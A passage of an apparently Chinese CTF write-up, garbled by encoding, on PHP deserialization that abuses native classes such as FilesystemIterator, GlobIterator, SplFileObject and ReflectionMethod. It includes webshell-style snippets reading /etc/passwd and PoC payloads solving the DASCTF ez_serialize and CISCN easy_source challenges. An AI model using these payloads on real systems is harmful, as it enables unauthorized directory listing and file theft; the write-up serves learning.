class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure>
<h5 id="ä½¿ç”¨filesystemiterator"><a class="markdownIt-Anchor" href="#ä½¿ç”¨filesystemiterator"></a> ä½¿ç”¨FilesystemIterator</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);<span class="comment">// ä¸åŠ __toString()ä¹Ÿå¯,å› ä¸ºechoå¯ä»¥è‡ªåŠ¨è°ƒç”¨</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">å…¶ä¸­cmd=glob:<span class="comment">///*</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payloadä¸€å¥è¯çš„å½¢å¼:</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure>
<h5 id="ä½¿ç”¨-globiterator-ç±»"><a class="markdownIt-Anchor" href="#ä½¿ç”¨-globiterator-ç±»"></a> ä½¿ç”¨ GlobIterator ç±»</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);<span class="comment">// ä¸åŠ __toString()ä¹Ÿå¯,å› ä¸ºechoå¯ä»¥è‡ªåŠ¨è°ƒç”¨</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">å…¶ä¸­cmd=<span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># payloadä¸€å¥è¯çš„å½¢å¼:</span></span><br><span class="line"><span class="comment">$a = new FilesystemIterator(&quot;/*&quot;);foreach($a as $f)&#123;</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);&#125;</span></span><br></pre></td></tr></table></figure>
<p>å‰é¢éƒ½æ˜¯è¯»å–æ–‡ä»¶ç›®å½•ï¼Œä¸‹é¢æ˜¯å¯ä»¥è¯»å–æ–‡ä»¶å†…å®¹</p>
<h4 id="å¯è¯»å–æ–‡ä»¶ç±»"><a class="markdownIt-Anchor" href="#å¯è¯»å–æ–‡ä»¶ç±»"></a> å¯è¯»å–æ–‡ä»¶ç±»</h4>
<h5 id="splfileobject-ç±»"><a class="markdownIt-Anchor" href="#splfileobject-ç±»"></a> SplFileObject ç±»</h5>
<p><a href="https://www.php.net/manual/zh/class.splfileobject.php">å®˜æ–¹æ–‡æ¡£</a></p>
<p>SplFileInfo ç±»ä¸ºå•ä¸ªæ–‡ä»¶çš„ä¿¡æ¯æä¾›äº†ä¸€ä¸ªé«˜çº§çš„é¢å‘å¯¹è±¡çš„æ¥å£ï¼Œå¯ä»¥ç”¨äºå¯¹æ–‡ä»¶å†…å®¹çš„éå†ã€æŸ¥æ‰¾ã€æ“ä½œ</p>
<p>æµ‹è¯•ï¼š</p>
<p>è¯»å–æ–‡ä»¶çš„ä¸€è¡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$context</span>;</span><br></pre></td></tr></table></figure>
<p>å¯¹æ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œå†…å®¹è¿›è¡Œéå†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$context</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="æå®¢å¤§æŒ‘æˆ˜-soezunser"><a class="markdownIt-Anchor" href="#æå®¢å¤§æŒ‘æˆ˜-soezunser"></a> æå®¢å¤§æŒ‘æˆ˜-SoEzUnser</h5>
<p><a href="https://blog.csdn.net/unexpectedthing/article/details/121664208">åšå®¢æ¨è</a></p>
<h5 id="2021-mar-dasctf-æ˜å¾¡æ”»é˜²èµ›ez_serialize"><a class="markdownIt-Anchor" href="#2021-mar-dasctf-æ˜å¾¡æ”»é˜²èµ›ez_serialize"></a> [2021 MAR DASCTF æ˜å¾¡æ”»é˜²èµ›]ez_serialize</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = &quot;<span class="title">B</span>&quot;;</span></span><br><span class="line"><span class="class">        $<span class="title">this</span>-&gt;<span class="title">para</span> = &quot;<span class="title">ctfer</span>&quot;;</span></span><br><span class="line"><span class="class">        <span class="title">echo</span> <span class="title">new</span>  $<span class="title">this</span>-&gt;<span class="title">class</span> ($<span class="title">this</span>-&gt;<span class="title">para</span>);</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">__wakeup</span>()    // å¯ä»¥ç›´æ¥ç»•è¿‡<span class="title">__wakeup</span>()æ–¹æ³•çš„æ‰§è¡Œ</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;check = <span class="keyword">new</span> C;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;check-&gt;<span class="title function_ invoke__">vaild</span>(<span class="variable">$this</span>-&gt;para) &amp;&amp; <span class="variable language_">$this</span>-&gt;check-&gt;<span class="title function_ invoke__">vaild</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>)) &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> ($<span class="title">this</span>-&gt;<span class="title">para</span>);</span></span><br><span class="line"><span class="class">        &#125;</span></span><br><span class="line"><span class="class">        <span class="title">else</span></span></span><br><span class="line"><span class="class">            <span class="title">die</span>(&#x27;<span class="title">bad</span> <span class="title">hacker</span>~&#x27;);</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿˜æ˜¯ä¸€æ ·çš„ï¼Œå…ˆä»£ç å®¡è®¡ï¼Œå‘ç°æ²¡æœ‰ä»€ä¹ˆå±é™©å‡½æ•°çš„åˆ©ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨åŸç”Ÿç±»æ¥åˆ©ç”¨äº†</p>
<p>é¦–å…ˆåˆ©ç”¨DirectoryIteratoræˆ–FilesystemIteratorç±»å»éå†ç›®æ ‡çš„Webç›®å½•ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&#x27;FilesystemIterator&#x27;</span>;    </span><br><span class="line">    <span class="comment">// FilesystemIterator(&quot;/var/www/html&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>=<span class="string">&quot;/var/www/html/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$poc</span>  = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œåå¾—åˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹ aMaz1ng_y0u_coUld_f1nd_F1Ag_hErEï¼š</p>
<p>ç„¶åè¿›å…¥è¿™ä¸ªæ–‡ä»¶å¤¹</p>
<p>poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&#x27;FilesystemIterator&#x27;</span>;    </span><br><span class="line">    <span class="comment">// FilesystemIterator(&quot;/var/www/html&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>=<span class="string">&quot;/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$poc</span>  = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br></pre></td></tr></table></figure>
<p>çœ‹åˆ°flag.php</p>
<p>ç°åœ¨æˆ‘ä»¬åªéœ€è¦è¯»å–æ–‡ä»¶å†…å®¹ï¼Œåˆ©ç”¨<code>SplFileObjectç±»</code></p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&#x27;SplFileObject&#x27;</span>;    </span><br><span class="line">    <span class="comment">// SplFileObject(&quot;/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>=<span class="string">&quot;/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$poc</span>  = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>);</span><br></pre></td></tr></table></figure>
<p>èƒ½å¦åˆ©ç”¨åŸç”Ÿç±»è¯»å–æ–‡ä»¶å†…å®¹å’Œæ–‡ä»¶ç›®å½•ï¼Ÿ</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">echo <span class="keyword">new</span>  <span class="type"></span>$<span class="built_in">this</span>-&gt;<span class="class"><span class="keyword">class</span> (</span>$<span class="built_in">this</span>-&gt;para)</span><br></pre></td></tr></table></figure>
<p>è¿™è¡Œä»£ç æ¯”è¾ƒå…³é”®ï¼Œå°±æ˜¯èƒ½å¦åˆ©ç”¨åŸç”Ÿç±»çš„å…³é”®</p>
<h4 id="ä½¿ç”¨-reflectionmethod-ç±»è·å–ç±»æ–¹æ³•çš„ç›¸å…³ä¿¡æ¯"><a class="markdownIt-Anchor" href="#ä½¿ç”¨-reflectionmethod-ç±»è·å–ç±»æ–¹æ³•çš„ç›¸å…³ä¿¡æ¯"></a> ä½¿ç”¨ ReflectionMethod ç±»è·å–ç±»æ–¹æ³•çš„ç›¸å…³ä¿¡æ¯</h4>
<h5 id="reflectionmethod"><a class="markdownIt-Anchor" href="#reflectionmethod"></a> ReflectionMethod</h5>
<p><strong>ReflectionMethod</strong> ç±»æŠ¥å‘Šäº†ä¸€ä¸ªæ–¹æ³•çš„æœ‰å…³ä¿¡æ¯ã€‚å¯ä»¥åœ¨ PHP è¿è¡ŒçŠ¶æ€ä¸­ï¼Œæ‰©å±•åˆ†æ PHP ç¨‹åºï¼Œå¯¼å‡ºæˆ–æå–å‡ºå…³äºç±»ã€æ–¹æ³•ã€å±æ€§ã€å‚æ•°ç­‰çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ³¨é‡Šã€‚è¿™ç§åŠ¨æ€è·å–çš„ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•çš„åŠŸèƒ½ç§°ä¸ºåå°„API</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReflectionMethod</span> <span class="keyword">extends</span> <span class="title">ReflectionFunctionAbstract</span> <span class="keyword">implements</span> <span class="title">Reflector</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    	</span><br><span class="line"><span class="comment">/*æ–¹æ³•*/</span></span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">__construct</span> â€” ReflectionMethod çš„æ„é€ å‡½æ•°</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">export</span> â€” è¾“å‡ºä¸€ä¸ªå›è°ƒæ–¹æ³•</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">getClosure</span> â€” è¿”å›ä¸€ä¸ªåŠ¨æ€å»ºç«‹çš„æ–¹æ³•è°ƒç”¨æ¥å£ï¼Œè¯‘è€…æ³¨ï¼šå¯ä»¥ä½¿ç”¨è¿™ä¸ªè¿”å›å€¼ç›´æ¥è°ƒç”¨éå…¬å¼€æ–¹æ³•ã€‚</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">getDeclaringClass</span> â€” è·å–è¢«åå°„çš„æ–¹æ³•æ‰€åœ¨ç±»çš„åå°„å®ä¾‹</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">getModifiers</span> â€” è·å–æ–¹æ³•çš„ä¿®é¥°ç¬¦</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">getPrototype</span> â€” è¿”å›æ–¹æ³•åŸå‹ (å¦‚æœå­˜åœ¨)</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">invoke</span> â€” Invoke</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">invokeArgs</span> â€” å¸¦å‚æ•°æ‰§è¡Œ</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isAbstract</span> â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯æŠ½è±¡æ–¹æ³•</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isConstructor</span> â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯æ„é€ æ–¹æ³•</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isDestructor</span> â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯ææ„æ–¹æ³•</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isFinal</span> â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦å®šä¹‰ <span class="keyword">final</span></span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isPrivate</span> â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯ç§æœ‰æ–¹æ³•</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isProtected</span> â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯ä¿æŠ¤æ–¹æ³• (<span class="keyword">protected</span>)</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isPublic</span> â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯å…¬å¼€æ–¹æ³•</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isStatic</span> â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯é™æ€æ–¹æ³•</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">setAccessible</span> â€” è®¾ç½®æ–¹æ³•æ˜¯å¦è®¿é—®</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">__toString</span> â€” è¿”å›åå°„æ–¹æ³•å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨è¾¾</span><br><span class="line">        </span><br><span class="line"><span class="comment">/*ç»§æ‰¿çš„æ–¹æ³•*/</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">private</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">__clone</span>(): <span class="keyword">void</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getAttributes</span>(?<span class="keyword">string</span> <span class="variable">$name</span> = <span class="literal">null</span>, <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span>): <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getClosureScopeClass</span>(): ?ReflectionClass</span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getClosureThis</span>(): <span class="keyword">object</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getDocComment</span>(): <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getEndLine</span>(): <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getExtension</span>(): ReflectionExtension</span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getExtensionName</span>(): <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getFileName</span>(): <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getName</span>(): <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getNamespaceName</span>(): <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getNumberOfParameters</span>(): <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getNumberOfRequiredParameters</span>(): <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getParameters</span>(): <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getReturnType</span>(): ?ReflectionType</span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getShortName</span>(): <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getStartLine</span>(): <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getStaticVariables</span>(): <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">hasReturnType</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">inNamespace</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">isClosure</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">isDeprecated</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">isGenerator</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">isInternal</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">isUserDefined</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">isVariadic</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">returnsReference</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">__toString</span>(): <span class="keyword">void</span></span><br></pre></td></tr></table></figure>
<p>ReflectionMethod ç±»ä¸­æœ‰å¾ˆå¤šç»§æ‰¿æ–¹æ³•å¯ä»¥ä½¿ç”¨ï¼Œæ¯”å¦‚è¿™ä¸ª <code>getDocComment()</code> æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å®ƒæ¥è·å–ç±»ä¸­å„ä¸ªå‡½æ•°æ³¨é‡Šå†…å®¹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ˆå€Ÿç”¨ä¸‹å›¾ï¼‰</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/4bed8c444b5d6640cfde958fa1b83753-166727395787411.png" alt="image-20210516101052113"></p>
<h5 id="2021-ciscneasy_source"><a class="markdownIt-Anchor" href="#2021-ciscneasy_source"></a> [2021 CISCN]easy_source</h5>
<p>å…ˆçœ‹ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span 